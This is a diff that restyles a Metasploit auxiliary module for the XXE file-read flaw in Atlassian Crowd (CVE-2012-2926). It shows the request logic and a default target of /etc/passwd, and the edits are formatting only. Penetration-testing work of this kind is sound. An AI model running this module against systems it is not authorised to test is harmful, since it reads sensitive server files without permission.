@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,20 +7,19 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
-      'Name'         => 'Atlassian Crowd XML Entity Expansion Remote File Access',
-      'Description'  =>  %q{
+      'Name' => 'Atlassian Crowd XML Entity Expansion Remote File Access',
+      'Description' => %q(
           This module simply attempts to read a remote file from the server using a
         vulnerability in the way Atlassian Crowd handles XML files. The vulnerability
         occurs while trying to expand external entities with the SYSTEM identifier. This
         module has been tested successfully on Linux and Windows installations of Crowd.
-      },
+      ),
       'References'   =>
         [
           [ 'CVE', '2012-2926' ],
@@ -39,12 +39,13 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options(
-    [
-      Opt::RPORT(8095),
-      OptString.new('TARGETURI', [true, 'Path to Crowd', '/crowd/services']),
-      OptString.new('RFILE', [true, 'Remote File', '/etc/passwd'])
+      [
+        Opt::RPORT(8095),
+        OptString.new('TARGETURI', [true, 'Path to Crowd', '/crowd/services']),
+        OptString.new('RFILE', [true, 'Remote File', '/etc/passwd'])
 
-    ], self.class)
+      ], self.class
+    )
 
     register_autofilter_ports([ 8095 ])
     deregister_options('RHOST')
@@ -52,11 +53,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     uri = normalize_uri(target_uri.path)
-    res = send_request_cgi({
-      'uri'     => uri,
-      'method'  => 'GET'})
+    res = send_request_cgi('uri' => uri,
+                           'method' => 'GET')
 
-    if not res
+    unless res
       print_error("#{rhost}:#{rport} Unable to connect")
       return
     end
@@ -117,19 +117,20 @@ class MetasploitModule < Msf::Auxiliary
     data << '</soap:attributes>' + "\r\n"
 
     res = send_request_cgi({
-        'uri'      => uri,
-        'method'   => 'POST',
-        'ctype'    => 'text/xml; charset=UTF-8',
-        'data'     => data,
-        'headers'  => {
-          'SOAPAction'    => '""',
-        }}, 60)
+                             'uri' => uri,
+                             'method'   => 'POST',
+                             'ctype'    => 'text/xml; charset=UTF-8',
+                             'data'     => data,
+                             'headers'  => {
+                               'SOAPAction' => '""'
+                             }
+                           }, 60)
 
-    if res and res.code == 500
+    if res && (res.code == 500)
       case res.body
       when /<faultstring\>Invalid boolean value: \?(.*)<\/faultstring>/m
-        loot = $1
-        if not loot or loot.empty?
+        loot = Regexp.last_match(1)
+        if !loot || loot.empty?
           print_status("#{rhost}#{rport} Retrieved empty file from #{rhost}:#{rport}")
           return
         end
@@ -142,6 +143,4 @@ class MetasploitModule < Msf::Auxiliary
 
     print_error("#{rhost}#{rport} Failed to retrieve file from #{rhost}:#{rport}")
   end
-
 end
-
